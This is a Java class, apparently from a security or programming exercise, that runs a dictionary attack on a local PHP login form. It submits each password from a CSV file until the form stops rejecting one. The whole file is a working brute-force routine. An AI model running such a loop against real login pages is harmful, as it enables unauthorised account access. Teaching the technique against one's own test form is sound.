import java.util.*;
import java.io.*;
import java.net.*;

public class Dictionnaire extends Cracker {

    public String passwordCrack() throws Exception {
        InputStream document = new FileInputStream("dictionnaire.csv");

        try (Scanner obj = new Scanner(document)) {
            while (obj.hasNextLine()) {
                String pwd = obj.next();
                URL url = new URL("http://localhost/formulaire1.php?pwd=" + pwd);
                URLConnection connection = url.openConnection();

                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(connection.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null) {
                        if (line.equals("c'est pas le bon")) {
                            // Ne rien faire ici si le résultat n'est pas correct
                        } else {
                            // Afficher uniquement les résultats corrects
                            System.out.println("Connexion reussie");
                            System.out.println("Mot de passe trouvé : " + pwd);
                            return null;
                        }
                    }
                }

            }
            obj.close();
        }
        System.out.println("Aucun mot de passe trouvé.");
        return null;
    }
}